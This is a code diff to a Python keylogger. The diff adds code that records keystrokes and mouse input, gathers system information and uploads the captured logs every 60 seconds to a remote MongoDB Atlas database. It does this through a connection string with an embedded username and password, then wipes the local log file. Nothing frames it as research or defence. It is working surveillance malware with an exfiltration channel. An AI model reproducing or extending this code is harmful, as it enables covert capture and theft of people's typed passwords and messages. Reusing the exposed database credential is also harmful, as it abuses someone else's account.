@@ -8,24 +8,35 @@ import sounddevice as sd
 import logging
 import datetime
 import pygetwindow
+import pymongo
+from pymongo import DeleteMany
 from pynput import keyboard
 from pynput.keyboard import Listener
 from pynput.mouse import Listener as MouseListener
 
-SEND_REPORT_EVERY = 10  # as in seconds
+SEND_REPORT_EVERY = 60  # as in seconds
 LOG_FILE = 'keylogs.txt'  # File to store logs
+
+# Connect to MongoDB
+client = pymongo.MongoClient("mongodb+srv://samratdey:mongoYzNqs%3DaQT1@keyspy.iarapa1.mongodb.net/")
+db = client["keylogger"]
+keylogs_collection = db["keylog"]
 
 class KeyLogger:
     def __init__(self, time_interval):
         self.interval = time_interval
-        self.log = "KeyLogger Started..."
-        logging.basicConfig(filename=("keylogs.txt"), level=logging.INFO, format="%(asctime)s> %(message)s")
+        self.log = ""
         self.log_file = 'keylogs.txt'
+
+        # Delete existing keylogs.txt file if present
+        if os.path.exists(self.log_file):
+            os.remove(self.log_file)
+
+        logging.basicConfig(filename=self.log_file, level=logging.INFO, format="%(asctime)s> %(message)s")
 
     def append_log(self, log):
         with open(self.log_file, 'a') as file:  # Append mode to add new logs
             file.write(log + '\n')
-
 
     def save_log(self, log):
         with open(self.log_file, 'w') as file:  # Open file in write mode to overwrite
@@ -69,10 +80,30 @@ class KeyLogger:
 
     def report(self):
         global logs
-        self.append_log(self.log)  # Save log to file
+        self.store_in_mongodb()  # Store logs in MongoDB
+        self.save_log(self.log)  # Save log to file
         self.log = ""  # Clear current log
         timer = threading.Timer(self.interval, self.report)
         timer.start()
+
+    def store_in_mongodb(self):
+        # Read the text file
+        file_path = "keylogs.txt"
+        with open(file_path, "r") as file:
+            lines = file.readlines()
+
+        # Insert each line as a separate document into the collection
+        for line in lines:
+            # Strip any leading/trailing whitespace and skip empty lines
+            line = line.strip()
+            if line:
+                document = {"text": line}
+                keylogs_collection.insert_one(document)
+
+        print("Text content stored in MongoDB successfully.")
+
+        # Clear the contents of the text file
+        self.save_log("")
 
     def system_information(self):
         hostname = socket.gethostname()
@@ -136,6 +167,6 @@ class KeyLogger:
 
 # Start keylogger
 if __name__ == "__main__":
+    keylogs_collection.delete_many({})
     keylogger = KeyLogger(SEND_REPORT_EVERY)
     keylogger.run()
-
